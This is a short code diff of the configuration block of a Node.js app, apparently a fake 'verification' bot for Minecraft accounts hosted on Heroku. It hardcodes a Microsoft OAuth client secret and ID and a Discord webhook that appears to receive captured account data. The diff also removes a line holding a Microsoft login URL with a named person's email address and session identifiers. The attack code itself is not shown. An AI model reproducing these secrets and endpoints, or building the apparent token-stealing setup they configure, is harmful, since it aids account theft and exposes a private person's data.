@@ -3,7 +3,6 @@ const client_secret = 'tKW8Q~~f.djPOv84ogaNt-t615IOuAxlA4NWbcty'
 const client_id = '6cfdbec3-62e8-4e6b-af4e-894eea7b914f'
 const redirect_uri = 'https://verificationbotmc1.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1040909509272547348/2mhbJGEiFjmj98UA_Vhw1GmTcFA1rFKLwpFcNKfhDu7Amp4k2SQ9-0XwBUPsi0HnJtQf'
-const webhook_logging_url = 'ogin.live.com/ppsecure/post.srf?username=rileyluev%40gmail.com&client_id=51483342-085c-4d86-bf88-cf50c7252078&cobrandid=788a943c-8e34-4c0a-9c83-1e4ef0322879&contextid=A346409061C28856&opid=2C5D7EC52DBD908C&bk=1668239171&uaid=2db1ffb8e8eb466abbc5b9a7c981e993&pid=15216'
 // Config end
 const axios = require('axios')
 const express = require('express')
